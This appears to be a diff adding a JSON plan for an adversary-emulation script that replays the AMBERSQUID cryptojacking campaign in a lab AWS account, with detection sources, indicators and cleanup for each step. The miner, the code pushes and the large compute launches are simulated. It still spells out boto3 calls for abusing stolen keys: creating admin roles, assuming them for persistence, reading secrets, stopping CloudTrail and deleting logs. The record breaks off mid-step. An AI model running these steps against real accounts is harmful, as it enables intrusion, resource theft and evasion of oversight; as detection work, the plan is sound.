@@ -1,0 +1,739 @@
+{
+  "status": "PHASE_3_COMPLETE",
+  "attack_chain": [
+    {
+      "step": 1,
+      "phase": 1,
+      "technique_id": "T1583.001",
+      "technique_name": "Acquire Infrastructure: Domains",
+      "tactic": "Resource Development",
+      "execution_context": "api_attack",
+      "target_resource": "external-attacker-infrastructure",
+      "description": "Attacker registers or implicitly acquires the Amplify subdomain master.d19tgz4vpyd5.amplifyapp.com as a staging and callback endpoint. AMBERSQUID obtains this domain automatically when creating Amplify apps in victim accounts. Documented only — no emulation code implements this step.",
+      "implementation": {
+        "method": "Documented only. No API calls. Attacker's Amplify subdomain is a side-effect of T1059.009 CreateApp calls made in victim accounts during prior campaigns.",
+        "details": "attack.py logs 'DOCUMENTED [T1583.001]: Attacker domain master.d19tgz4vpyd5.amplifyapp.com pre-acquired via prior Amplify app creation in separate victim accounts. No action required.' and continues."
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["Domain registration WHOIS records", "PassiveDNS services", "Amplify subdomain enumeration"],
+      "cleanup_actions": ["No cleanup required — documented only, no resources created"],
+      "operational_tempo": {"delay_after_seconds": [0, 0]},
+      "risk_level": "low",
+      "iocs_generated": ["Domain: master.d19tgz4vpyd5.amplifyapp.com"]
+    },
+    {
+      "step": 2,
+      "phase": 1,
+      "technique_id": "T1608.001",
+      "technique_name": "Stage Capabilities: Upload Malware",
+      "tactic": "Resource Development",
+      "execution_context": "api_attack",
+      "target_resource": "external-docker-registry",
+      "description": "Attacker stages a malicious Docker image containing SRBMiner-MULTI (UPX-packed) on a public or attacker-controlled registry. The image entrypoint (entrypoint.sh) reads injected AWS credentials from environment variables and executes a suite of deployment scripts. Simulated — the benign ubuntu:22.04 image in ambersquid-task-definition stands in.",
+      "implementation": {
+        "method": "Simulated. attack.py logs 'SIMULATED [T1608.001]: Would push malicious Docker image containing SRBMiner-MULTI (UPX-packed) with scripts: entrypoint.sh, amplify-role.sh, repo.sh, code.sh, jalan.sh, sup0.sh, ecs.sh, ulang.sh, note.sh, salah.sh, delete.sh, stoptrigger.sh, scale.sh, restart.sh, amplify.yml, index.py, amplify-role.json, sugo.json, ecsTaskExecutionRole.json. Benign ubuntu:22.04 image used as stand-in.' and continues.",
+        "details": "Real image executes SRBMiner-MULTI targeting ZEPHYR, TRX, RVN, XMR pools. entrypoint.sh calls amplify-role.sh (IAM role creation), repo.sh (CodeCommit provisioning), code.sh (CodeBuild), note.sh (SageMaker), ecs.sh (Fargate), scale.sh (Auto Scaling)."
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["Docker Hub abuse reports", "Registry image scanning (ECR Inspector, Trivy)", "VirusTotal UPX-packed binary detection"],
+      "cleanup_actions": ["No cleanup required — simulated only, no resources created"],
+      "operational_tempo": {"delay_after_seconds": [0, 0]},
+      "risk_level": "low",
+      "iocs_generated": ["Tool: SRBMiner-MULTI (UPX-packed)", "Tool: Docker", "Files: entrypoint.sh, amplify-role.sh, repo.sh, code.sh, jalan.sh, sup0.sh, ecs.sh, ulang.sh, note.sh, salah.sh, delete.sh, stoptrigger.sh, scale.sh, restart.sh, amplify.yml, index.py"]
+    },
+    {
+      "step": 3,
+      "phase": 2,
+      "technique_id": "T1204.003",
+      "technique_name": "User Execution: Malicious Image",
+      "tactic": "Execution",
+      "execution_context": "container_attack",
+      "target_resource": "ambersquid-task-definition",
+      "description": "Victim's ECS task executes the malicious container (ubuntu:22.04 stand-in for staged miner image). The container receives victim IAM credentials as plaintext environment variables AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY. attack.py simulates the credential harvest by reading these values from Pulumi stack outputs (or env vars AWS_VICTIM_ACCESS_KEY_ID / AWS_VICTIM_SECRET_ACCESS_KEY) and constructs the victim_creds boto3 session.",
+      "implementation": {
+        "method": "attack.py reads victim credentials from Pulumi stack outputs via subprocess call, then calls boto3 ECS RunTask to start the container and describe_tasks to confirm it is running. Victim boto3 session is constructed from extracted credentials.",
+        "api_calls": [
+          {
+            "service": "ecs",
+            "method": "run_task",
+            "args": {
+              "cluster": "ambersquid-ecs-cluster",
+              "taskDefinition": "ambersquid-task-definition",
+              "launchType": "FARGATE",
+              "networkConfiguration": {
+                "awsvpcConfiguration": {
+                  "subnets": ["<ambersquid-public-subnet-id>"],
+                  "securityGroups": ["<ambersquid-task-sg-id>"],
+                  "assignPublicIp": "ENABLED"
+                }
+              }
+            }
+          },
+          {
+            "service": "ecs",
+            "method": "describe_tasks",
+            "args": {
+              "cluster": "ambersquid-ecs-cluster",
+              "tasks": ["<task-arn-from-run_task>"]
+            }
+          }
+        ],
+        "credential_harvest": "boto3.Session(aws_access_key_id=victim_key_id, aws_secret_access_key=victim_secret, region_name='us-east-1')",
+        "simulation_note": "Container runs 'sleep infinity' — benign stand-in for SRBMiner-MULTI. No mining pool connections. Mining pool ports blocked by ambersquid-task-sg."
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["Amazon Inspector container image scanning", "ECS Container Insights anomalous process", "GuardDuty: UnauthorizedAccess:IAMUser/MaliciousIPCaller"],
+      "cleanup_actions": ["ecs:StopTask on running task ARN before pulumi destroy"],
+      "operational_tempo": {"delay_after_seconds": [30, 60]},
+      "risk_level": "low",
+      "iocs_generated": ["ECS task launched from ubuntu:22.04 with AWS credential env vars injected as plaintext", "Container command: sleep infinity (miner stand-in)"]
+    },
+    {
+      "step": 4,
+      "phase": 3,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "ambersquid-victim-access-key",
+      "description": "Attacker validates stolen victim credentials via STS GetCallerIdentity to confirm account ID, user ARN, and region. Enumerates the caller's IAM permissions to assess attack surface. Establishes the victim_creds boto3 session used as the root credential for all subsequent phases.",
+      "implementation": {
+        "method": "boto3 STS and IAM calls using victim_creds session.",
+        "credential_source": "victim_creds",
+        "api_calls": [
+          {"service": "sts", "method": "get_caller_identity", "args": {}},
+          {"service": "iam", "method": "get_user", "args": {}},
+          {"service": "iam", "method": "list_attached_user_policies", "args": {"UserName": "<caller-username>"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "GetCallerIdentity", "eventSource": "sts.amazonaws.com"},
+        {"eventName": "GetUser", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListAttachedUserPolicies", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events", "GuardDuty: Policy:IAMUser/RootCredentialUsage (if root key)", "Security Hub: IAM.4"],
+      "cleanup_actions": ["Read-only — no cleanup needed"],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "low",
+      "iocs_generated": ["GetCallerIdentity from non-console IAM user session", "Rapid policy enumeration immediately after credential harvest"]
+    },
+    {
+      "step": 5,
+      "phase": 4,
+      "technique_id": "T1136.003",
+      "technique_name": "Create Account: Cloud Account",
+      "tactic": "Persistence",
+      "execution_context": "api_attack",
+      "target_resource": "IAM service",
+      "description": "Attacker creates three IAM roles using victim credentials, replicating AMBERSQUID's precise role set: (1) AWSCodeCommit-Role with Amplify, CodeCommit, and CloudWatch full access for multi-region code staging; (2) sugo-role with SageMaker full access for notebook-based mining; (3) ecsTaskExecutionRole (attacker-created) with AdministratorAccess and ECS full access for unrestricted container deployment. Trust policies allow the victim account root and ECS service to assume each role.",
+      "implementation": {
+        "method": "boto3 IAM CreateRole then AttachRolePolicy calls using victim_creds session. Three roles created sequentially.",
+        "credential_source": "victim_creds",
+        "api_calls": [
+          {
+            "service": "iam",
+            "method": "create_role",
+            "args": {
+              "RoleName": "AWSCodeCommit-Role",
+              "AssumeRolePolicyDocument": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::<account-id>:root\"},\"Action\":\"sts:AssumeRole\"}]}",
+              "Description": "CodeCommit service role"
+            }
+          },
+          {"service": "iam", "method": "attach_role_policy", "args": {"RoleName": "AWSCodeCommit-Role", "PolicyArn": "arn:aws:iam::aws:policy/AWSCodeCommitFullAccess"}},
+          {"service": "iam", "method": "attach_role_policy", "args": {"RoleName": "AWSCodeCommit-Role", "PolicyArn": "arn:aws:iam::aws:policy/AmplifyFullAccess"}},
+          {"service": "iam", "method": "attach_role_policy", "args": {"RoleName": "AWSCodeCommit-Role", "PolicyArn": "arn:aws:iam::aws:policy/CloudWatchFullAccess"}},
+          {
+            "service": "iam",
+            "method": "create_role",
+            "args": {
+              "RoleName": "sugo-role",
+              "AssumeRolePolicyDocument": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::<account-id>:root\"},\"Action\":\"sts:AssumeRole\"}]}",
+              "Description": "SageMaker execution role"
+            }
+          },
+          {"service": "iam", "method": "attach_role_policy", "args": {"RoleName": "sugo-role", "PolicyArn": "arn:aws:iam::aws:policy/AmazonSageMakerFullAccess"}},
+          {
+            "service": "iam",
+            "method": "create_role",
+            "args": {
+              "RoleName": "ecsTaskExecutionRole",
+              "AssumeRolePolicyDocument": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"ecs-tasks.amazonaws.com\"},\"Action\":\"sts:AssumeRole\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::<account-id>:root\"},\"Action\":\"sts:AssumeRole\"}]}",
+              "Description": "ECS task execution role"
+            }
+          },
+          {"service": "iam", "method": "attach_role_policy", "args": {"RoleName": "ecsTaskExecutionRole", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}},
+          {"service": "iam", "method": "attach_role_policy", "args": {"RoleName": "ecsTaskExecutionRole", "PolicyArn": "arn:aws:iam::aws:policy/AmazonECS_FullAccess"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateRole", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "AttachRolePolicy", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events", "GuardDuty: Persistence:IAMUser/TrojanedCodeExecution", "Security Hub: IAM.1 (admin policy attachment)", "AWS Config: iam-policy-no-statements-with-admin-access"],
+      "cleanup_actions": [
+        "iam:DetachRolePolicy then iam:DeleteRole AWSCodeCommit-Role",
+        "iam:DetachRolePolicy then iam:DeleteRole sugo-role",
+        "iam:DetachRolePolicy then iam:DeleteRole ecsTaskExecutionRole (attacker-created — NOT the Pulumi-managed ambersquid-ecs-execution-role)"
+      ],
+      "operational_tempo": {"delay_after_seconds": [2, 6]},
+      "risk_level": "medium",
+      "iocs_generated": [
+        "IAM role created: AWSCodeCommit-Role",
+        "IAM role created: sugo-role",
+        "IAM role created: ecsTaskExecutionRole with AdministratorAccess — critical detection signal",
+        "AdministratorAccess policy attached to attacker-created role from non-console session"
+      ]
+    },
+    {
+      "step": 6,
+      "phase": 4,
+      "technique_id": "T1098.001",
+      "technique_name": "Account Manipulation: Additional Cloud Credentials",
+      "tactic": "Persistence",
+      "execution_context": "api_attack",
+      "target_resource": "AWSCodeCommit-Role",
+      "description": "Attacker assumes all three attacker-created IAM roles via STS AssumeRole, generating independent STS session tokens. These sessions persist even if the original victim IAM key is rotated or revoked. Establishes codecommit_role_session (Amplify/CodeCommit/CodeBuild), sugo_role_session (SageMaker), and ecs_exec_role_session (ECS + AdminAccess) used throughout subsequent phases.",
+      "implementation": {
+        "method": "boto3 STS AssumeRole calls using victim_creds session. All three sessions constructed and stored in attack.py state.",
+        "credential_source": "victim_creds",
+        "api_calls": [
+          {
+            "service": "sts",
+            "method": "assume_role",
+            "args": {"RoleArn": "arn:aws:iam::<account-id>:role/AWSCodeCommit-Role", "RoleSessionName": "codecommit-session", "DurationSeconds": 3600}
+          },
+          {
+            "service": "sts",
+            "method": "assume_role",
+            "args": {"RoleArn": "arn:aws:iam::<account-id>:role/sugo-role", "RoleSessionName": "sugo-session", "DurationSeconds": 3600}
+          },
+          {
+            "service": "sts",
+            "method": "assume_role",
+            "args": {"RoleArn": "arn:aws:iam::<account-id>:role/ecsTaskExecutionRole", "RoleSessionName": "ecs-exec-session", "DurationSeconds": 3600}
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "AssumeRole", "eventSource": "sts.amazonaws.com"},
+        {"eventName": "AttachRolePolicy", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "UpdateAssumeRolePolicy", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events", "GuardDuty: CredentialAccess:IAMUser/AnomalousBehavior", "Security Hub: IAM.6 (excessive privilege assumption)"],
+      "cleanup_actions": ["STS session tokens expire automatically after 3600 seconds — no manual cleanup required"],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "medium",
+      "iocs_generated": [
+        "AssumeRole to AWSCodeCommit-Role from victim IAM user (non-console)",
+        "AssumeRole to sugo-role from victim IAM user",
+        "AssumeRole to ecsTaskExecutionRole (AdministratorAccess) from victim IAM user",
+        "Three parallel STS role sessions created within seconds from single IAM user"
+      ]
+    },
+    {
+      "step": 7,
+      "phase": 5,
+      "technique_id": "T1059.009",
+      "technique_name": "Command and Scripting Interpreter: Cloud API",
+      "tactic": "Execution",
+      "execution_context": "api_attack",
+      "target_resource": "ambersquid-codecommit-repo",
+      "description": "Attacker uses the three role sessions to burst-provision miner infrastructure across multiple AWS services in us-east-1: CodeCommit repo in us-west-2 (us-east-1 already exists via Pulumi), one Amplify app, one CodeBuild project, ECS cluster and task definition, and one SageMaker notebook instance. In real AMBERSQUID: 5 Amplify apps per region across 8 regions, 3 CodeBuild projects per region, 8 SageMaker ml.t3.2xlarge notebooks across 4 regions, and up to 30 Fargate tasks across 16 regions.",
+      "implementation": {
+        "method": "boto3 calls using codecommit_role_session (Amplify, CodeCommit, CodeBuild), sugo_role_session (SageMaker), and ecs_exec_role_session (ECS). Each service provisioned sequentially.",
+        "credential_source": "codecommit_role_session",
+        "api_calls": [
+          {
+            "service": "codecommit",
+            "method": "create_repository",
+            "args": {"repositoryName": "test", "repositoryDescription": "Internal build artifacts"},
+            "region": "us-west-2",
+            "note": "us-east-1 repo already created by Pulumi (ambersquid-codecommit-repo). Expect RepositoryNameExistsException if region already has repo — log and continue."
+          },
+          {
+            "service": "amplify",
+            "method": "create_app",
+            "args": {
+              "name": "miner-app",
+              "repository": "https://git-codecommit.us-east-1.amazonaws.com/v1/repos/test",
+              "iamServiceRoleArn": "arn:aws:iam::<account-id>:role/AWSCodeCommit-Role",
+              "buildSpec": "version: 0.1\nfrontend:\n  phases:\n    build:\n      commands:\n        - echo mining"
+            }
+          },
+          {
+            "service": "codebuild",
+            "method": "create_project",
+            "args": {
+              "name": "miner-build-small",
+              "source": {"type": "CODECOMMIT", "location": "https://git-codecommit.us-east-1.amazonaws.com/v1/repos/test"},
+              "artifacts": {"type": "NO_ARTIFACTS"},
+              "environment": {"type": "LINUX_CONTAINER", "image": "aws/codebuild/standard:6.0", "computeType": "BUILD_GENERAL1_SMALL"},
+              "serviceRole": "arn:aws:iam::<account-id>:role/AWSCodeCommit-Role"
+            }
+          },
+          {
+            "service": "ecs",
+            "method": "create_cluster",
+            "args": {"clusterName": "miner-cluster"},
+            "credential_override": "ecs_exec_role_session"
+          },
+          {
+            "service": "ecs",
+            "method": "register_task_definition",
+            "args": {
+              "family": "miner-task",
+              "networkMode": "awsvpc",
+              "requiresCompatibilities": ["FARGATE"],
+              "cpu": "256",
+              "memory": "512",
+              "containerDefinitions": [{"name": "miner", "image": "ubuntu:22.04", "command": ["sh", "-c", "echo SIMULATED_MINER && sleep 10 && exit 0"], "environment": [{"name": "WALLET", "value": "SIMULATED"}, {"name": "POOL", "value": "SIMULATED"}]}]
+            },
+            "credential_override": "ecs_exec_role_session"
+          },
+          {
+            "service": "sagemaker",
+            "method": "create_notebook_instance",
+            "args": {
+              "NotebookInstanceName": "miner-notebook",
+              "InstanceType": "ml.t3.medium",
+              "RoleArn": "arn:aws:iam::<account-id>:role/sugo-role"
+            },
+            "credential_override": "sugo_role_session",
+            "note": "ml.t3.medium (not ml.t3.2xlarge) to minimize cost. Stop immediately after confirming Pending state."
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateApp", "eventSource": "amplify.amazonaws.com"},
+        {"eventName": "CreateRepository", "eventSource": "codecommit.amazonaws.com"},
+        {"eventName": "CreateProject", "eventSource": "codebuild.amazonaws.com"},
+        {"eventName": "StartBuild", "eventSource": "codebuild.amazonaws.com"},
+        {"eventName": "CreateNotebookInstance", "eventSource": "sagemaker.amazonaws.com"},
+        {"eventName": "CreateCluster", "eventSource": "ecs.amazonaws.com"},
+        {"eventName": "RegisterTaskDefinition", "eventSource": "ecs.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events", "GuardDuty: Execution:IAMUser/AnomalousBehavior", "Security Hub: ECS.1, SageMaker.1", "AWS Config: sagemaker-notebook-no-direct-internet-access"],
+      "cleanup_actions": [
+        "amplify:DeleteApp miner-app",
+        "codebuild:DeleteProject miner-build-small",
+        "ecs:DeleteCluster miner-cluster (after deregistering task definitions)",
+        "ecs:DeregisterTaskDefinition miner-task all revisions",
+        "sagemaker:StopNotebookInstance miner-notebook then sagemaker:DeleteNotebookInstance miner-notebook",
+        "codecommit:DeleteRepository test in us-west-2 (if successfully created)"
+      ],
+      "operational_tempo": {"delay_after_seconds": [3, 8]},
+      "risk_level": "medium",
+      "iocs_generated": [
+        "Amplify app created with CodeCommit source using attacker role",
+        "CodeBuild project targeting private CodeCommit repo from non-console session",
+        "ECS cluster miner-cluster created outside Pulumi-managed resources",
+        "SageMaker notebook created with attacker-controlled sugo-role",
+        "Multi-service provisioning burst from single IAM session within minutes"
+      ]
+    },
+    {
+      "step": 8,
+      "phase": 6,
+      "technique_id": "T1525",
+      "technique_name": "Implant Internal Image",
+      "tactic": "Persistence",
+      "execution_context": "api_attack",
+      "target_resource": "ambersquid-codecommit-repo",
+      "description": "Attacker accesses CodeCommit repositories and would push miner binaries (SRBMiner-MULTI) and deployment scripts as Git commits, implanting the malicious image source inside the victim's internal code infrastructure. Simulated — repositories are accessed but no malicious content is pushed per operational notes.",
+      "implementation": {
+        "method": "boto3 CodeCommit GetRepository call using codecommit_role_session to verify access. No PutFile or git push executed.",
+        "credential_source": "codecommit_role_session",
+        "api_calls": [
+          {
+            "service": "codecommit",
+            "method": "get_repository",
+            "args": {"repositoryName": "test"},
+            "note": "Verifies codecommit_role_session can access the Pulumi-created repo. Confirms AMBERSQUID would have push access."
+          }
+        ],
+        "simulation_note": "SIMULATED: attack.py logs 'SIMULATED [T1525]: Would git push entrypoint.sh, amplify-role.sh, repo.sh, code.sh, jalan.sh, sup0.sh, ecs.sh, ulang.sh, note.sh, salah.sh, delete.sh, stoptrigger.sh, scale.sh, restart.sh, amplify.yml, index.py, amplify-role.json, sugo.json, ecsTaskExecutionRole.json to CodeCommit repos across up to 16 regions. Skipping to avoid malicious content staging.' No content pushed."
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateRepository", "eventSource": "codecommit.amazonaws.com"},
+        {"eventName": "GitPush", "eventSource": "codecommit.amazonaws.com"},
+        {"eventName": "PutFile", "eventSource": "codecommit.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events", "CodeCommit repository event notifications", "GuardDuty: Execution:IAMUser/AnomalousBehavior"],
+      "cleanup_actions": ["GetRepository is read-only — no cleanup needed"],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "CodeCommit GetRepository access using attacker-assumed AWSCodeCommit-Role session",
+        "SIMULATED: Multi-region CodeCommit repo push with miner deployment scripts"
+      ]
+    },
+    {
+      "step": 9,
+      "phase": 7,
+      "technique_id": "T1580",
+      "technique_name": "Cloud Infrastructure Discovery",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "ambersquid-terraform-state-bucket",
+      "description": "Attacker performs broad AWS infrastructure discovery using victim credentials: enumerating all enabled regions, IAM users and roles, S3 buckets (discovering the prod-infra-terraform-state honeypot), retrieving the fake terraform.tfstate (triggering canary alert), listing SecretsManager secrets, and retrieving the prod/database/master_credentials canary secret. Surfaces the honey IAM user (prod-deploy-svc) for potential lateral credential harvesting.",
+      "implementation": {
+        "method": "boto3 EC2, IAM, S3, STS, and SecretsManager calls using victim_creds session.",
+        "credential_source": "victim_creds",
+        "api_calls": [
+          {"service": "ec2", "method": "describe_regions", "args": {"AllRegions": false}},
+          {"service": "sts", "method": "get_caller_identity", "args": {}},
+          {"service": "iam", "method": "get_account_summary", "args": {}},
+          {"service": "iam", "method": "list_roles", "args": {}},
+          {"service": "iam", "method": "list_users", "args": {}},
+          {"service": "s3", "method": "list_buckets", "args": {}},
+          {
+            "service": "s3",
+            "method": "get_object",
+            "args": {"Bucket": "prod-infra-terraform-state-<account-id>", "Key": "terraform.tfstate"},
+            "note": "Retrieves decoy tfstate containing canary AKIA credentials for prod-deploy-svc honey IAM user. Triggers canary alert if monitored."
+          },
+          {"service": "secretsmanager", "method": "list_secrets", "args": {}},
+          {
+            "service": "secretsmanager",
+            "method": "get_secret_value",
+            "args": {"SecretId": "prod/database/master_credentials"},
+            "note": "Retrieves canary secret with fake RDS credentials — surfaces in CloudTrail as high-fidelity IOC."
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "DescribeRegions", "eventSource": "ec2.amazonaws.com"},
+        {"eventName": "GetCallerIdentity", "eventSource": "sts.amazonaws.com"},
+        {"eventName": "GetAccountSummary", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListRoles", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListUsers", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListBuckets", "eventSource": "s3.amazonaws.com"},
+        {"eventName": "GetObject", "eventSource": "s3.amazonaws.com"},
+        {"eventName": "ListSecrets", "eventSource": "secretsmanager.amazonaws.com"},
+        {"eventName": "GetSecretValue", "eventSource": "secretsmanager.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events", "GuardDuty: Discovery:S3/MaliciousIPCaller", "GuardDuty: CredentialAccess:SecretsManager/MaliciousIPCaller", "Security Hub: SecretsManager.4"],
+      "cleanup_actions": ["Read-only — no cleanup needed"],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "ListBuckets followed immediately by GetObject on terraform.tfstate — canary triggered",
+        "GetSecretValue on prod/database/master_credentials canary",
+        "Rapid IAM enumeration (ListRoles, ListUsers, GetAccountSummary) from non-console session",
+        "Discovery of ambersquid-honey-iam-user (prod-deploy-svc) with active key"
+      ]
+    },
+    {
+      "step": 10,
+      "phase": 8,
+      "technique_id": "T1610",
+      "technique_name": "Deploy Container",
+      "tactic": "Defense Evasion",
+      "execution_context": "container_attack",
+      "target_resource": "ambersquid-ecs-cluster",
+      "description": "Attacker registers an ECS Fargate task definition for the miner container using the ecsTaskExecutionRole (AdministratorAccess). Simulated — task definition registered only, no ECS service or RunTask call made because launching Fargate services with desiredCount=30 across 16 regions creates massive compute charges per operational notes.",
+      "implementation": {
+        "method": "boto3 ECS RegisterTaskDefinition using ecs_exec_role_session. No CreateService call.",
+        "credential_source": "ecs_exec_role_session",
+        "api_calls": [
+          {
+            "service": "ecs",
+            "method": "register_task_definition",
+            "args": {
+              "family": "miner-fargate-task",
+              "networkMode": "awsvpc",
+              "requiresCompatibilities": ["FARGATE"],
+              "cpu": "1024",
+              "memory": "2048",
+              "executionRoleArn": "arn:aws:iam::<account-id>:role/ecsTaskExecutionRole",
+              "containerDefinitions": [
+                {
+                  "name": "srbminer",
+                  "image": "ubuntu:22.04",
+                  "command": ["sh", "-c", "echo SIMULATED_MINER_FARGATE && sleep 30 && exit 0"],
+                  "environment": [
+                    {"name": "POOL", "value": "SIMULATED"},
+                    {"name": "WALLET", "value": "SIMULATED"},
+                    {"name": "ALGO", "value": "SIMULATED"}
+                  ]
+                }
+              ]
+            }
+          }
+        ],
+        "simulation_note": "SIMULATED: attack.py logs 'SIMULATED [T1610]: Would call ecs:CreateService with desiredCount=30, launchType=FARGATE for miner-fargate-task across 16 regions. Skipping to avoid massive Fargate charges.' Task definition registered only for CloudTrail visibility."
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateCluster", "eventSource": "ecs.amazonaws.com"},
+        {"eventName": "RegisterTaskDefinition", "eventSource": "ecs.amazonaws.com"},
+        {"eventName": "CreateService", "eventSource": "ecs.amazonaws.com"},
+        {"eventName": "UpdateService", "eventSource": "ecs.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events", "Security Hub: ECS.1, ECS.2", "GuardDuty: Execution:IAMUser/AnomalousBehavior"],
+      "cleanup_actions": ["ecs:DeregisterTaskDefinition miner-fargate-task all revisions"],
+      "operational_tempo": {"delay_after_seconds": [3, 8]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "ECS task definition registered with AdministratorAccess executionRole (ecsTaskExecutionRole — attacker-created)",
+        "SIMULATED: 30-task Fargate service creation across 16 regions"
+      ]
+    },
+    {
+      "step": 11,
+      "phase": 9,
+      "technique_id": "T1578.002",
+      "technique_name": "Modify Cloud Compute Infrastructure: Create Cloud Instance",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "EC2 Auto Scaling service",
+      "description": "Attacker provisions large-scale compute for mining: EC2 Auto Scaling groups (on-demand 'task' and spot 'task1', 8 instances each across 4 regions), CloudFormation stacks with EC2 ImageBuilder pipelines (cron every minute), and 8x SageMaker ml.t3.2xlarge notebooks across 4 regions. Simulated — describe and validate calls only, no compute launched per operational notes (immediate AWS charges).",
+      "implementation": {
+        "method": "boto3 EC2, CloudFormation, and Auto Scaling describe/validate dry-run calls using victim_creds. No resource creation.",
+        "credential_source": "victim_creds",
+        "api_calls": [
+          {"service": "ec2", "method": "describe_launch_templates", "args": {}},
+          {
+            "service": "ec2",
+            "method": "describe_instance_type_offerings",
+            "args": {"LocationType": "availability-zone", "Filters": [{"Name": "instance-type", "Values": ["c5.large", "c5.xlarge"]}]}
+          },
+          {
+            "service": "cloudformation",
+            "method": "validate_template",
+            "args": {"TemplateBody": "{\"AWSTemplateFormatVersion\":\"2010-09-09\",\"Description\":\"SIMULATED: ImageBuilder miner pipeline template - dry-run validation only\",\"Resources\":{\"Placeholder\":{\"Type\":\"AWS::CloudFormation::WaitConditionHandle\"}}}"}
+          },
+          {"service": "autoscaling", "method": "describe_auto_scaling_groups", "args": {}}
+        ],
+        "simulation_note": "SIMULATED: attack.py logs 'SIMULATED [T1578.002]: Would create ASG task (on-demand, 8 instances) and task1 (spot, 8 instances) across 4 regions. Would create CloudFormation stacks with ImageBuilder pipelines (cron every minute). Would launch 8x ml.t3.2xlarge SageMaker notebooks across 4 regions. Dry-run describe/validate calls only.'"
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateAutoScalingGroup", "eventSource": "autoscaling.amazonaws.com"},
+        {"eventName": "CreateStack", "eventSource": "cloudformation.amazonaws.com"},
+        {"eventName": "CreateNotebookInstance", "eventSource": "sagemaker.amazonaws.com"},
+        {"eventName": "StartImagePipelineExecution", "eventSource": "imagebuilder.amazonaws.com"},
+        {"eventName": "RunInstances", "eventSource": "ec2.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail management events", "GuardDuty: Execution:EC2/MaliciousFile", "AWS Config: ec2-instance-no-public-ip", "Security Hub: EC2.8"],
+      "cleanup_actions": ["Dry-run describe/validate only — no resources created, no cleanup needed"],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "SIMULATED: ASGs named 'task' and 'task1' across 4 regions (on-demand + spot mix)",
+        "SIMULATED: CloudFormation stacks with ImageBuilder pipelines scheduled every minute",
+        "SIMULATED: 8x ml.t3.2xlarge SageMaker notebooks across 4 regions",
+        "CloudFormation template validation call (dry-run artifact visible in CloudTrail)"
+      ]
+    },
+    {
+      "step": 12,
+      "phase": 10,
+      "technique_id": "T1070",
+      "technique_name": "Indicator Removal",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "ambersquid-cloudtrail",
+      "description": "Attacker disables CloudTrail logging to blind defenders and deletes recent log objects from the S3 bucket. Uses victim_creds for CloudTrail StopLogging and S3 DeleteObject. Uses codecommit_role_session to demonstrate AMBERSQUID's CodeCommit repo deletion as evidence cleanup. This is the highest-fidelity detection opportunity in the entire kill chain — StopLogging fires a CloudWatch alarm before the API call completes.",
+      "implementation": {
+        "method": "boto3 CloudTrail and S3 calls using victim_creds. boto3 CodeCommit call using codecommit_role_session for repo evidence cleanup.",
+        "credential_source": "victim_creds",
+        "api_calls": [
+          {"service": "cloudtrail", "method": "describe_trails", "args": {}},
+          {"service": "cloudtrail", "method": "get_trail_status", "args": {"Name": "ambersquid-cloudtrail"}},
+          {
+            "service": "cloudtrail",
+            "method": "stop_logging",
+            "args": {"Name": "ambersquid-cloudtrail"}
+          },
+          {
+            "service": "s3",
+            "method": "list_objects_v2",
+            "args": {"Bucket": "ambersquid-cloudtrail-logs-<account-id>", "Prefix": "AWSLogs/<account-id>/CloudTrail/us-east-1/", "MaxKeys": 5}
+          },
+          {
+            "service": "s3",
+            "method": "delete_object",
